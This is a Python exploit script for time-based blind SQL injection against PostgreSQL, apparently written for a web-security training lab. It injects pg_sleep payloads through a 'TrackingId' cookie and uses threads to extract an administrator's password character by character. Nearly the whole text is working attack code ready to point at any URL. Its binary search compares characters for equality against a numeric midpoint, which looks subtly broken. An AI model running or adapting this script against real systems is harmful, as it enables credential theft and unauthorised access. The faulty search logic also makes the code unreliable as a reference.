#!/usr/bin/python3

import sys
import requests
import urllib3
import urllib
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

threads = []
password_list = [None] * 20
Password = ""

def sqli_password(url, i, low, high):
    global password_list
    
    if low > high:
        return

    mid = (low + high) // 2
    sqli_payload = "' || (SELECT CASE WHEN (username='administrator' and SUBSTRING(password,%s,1)='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" % (i, mid)
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'Im9h0GCfSwmtDRJI' + sqli_payload_encoded, 'session': 'c5Fy5Lk1r34XfR5LjxncsO5KX97iQnyn'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds() > 10):
        password_list[i-1] = chr(mid + 1)
        sqli_password(url, i, mid + 1, high)

    else:
        sqli_password(url, i, low, mid - 1)



def sqli_password_thread_for_each_char(url, i):
    sqli_password(url, i, 32, 126)


def main():
    global threads
    global password_list
    global Password
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        return

    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    for i in range(1, 21):
        t = threading.Thread(target=sqli_password_thread_for_each_char, args=(url, i))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    for char in password_list:
        Password += str(char)

    print("Password: " + Password)


if __name__ == "__main__":
    main()
